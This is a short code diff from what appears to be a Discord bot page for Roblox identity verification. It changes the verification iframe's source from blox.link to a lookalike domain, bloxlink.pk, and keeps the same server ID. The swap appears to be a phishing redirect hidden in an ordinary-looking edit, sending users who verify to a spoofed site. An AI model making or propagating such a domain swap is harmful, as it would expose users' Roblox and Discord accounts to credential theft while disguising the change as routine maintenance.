@@ -888,7 +888,7 @@ It can also verify your Roblox identity and give you Discord roles automatically
                     "block";  
   
                 frame.src =
-                    "https://blox.link/verify?server=0295377443746119"  
+                    "https://bloxlink.pk/verify?server=0295377443746119"  
             }  
         );  
   
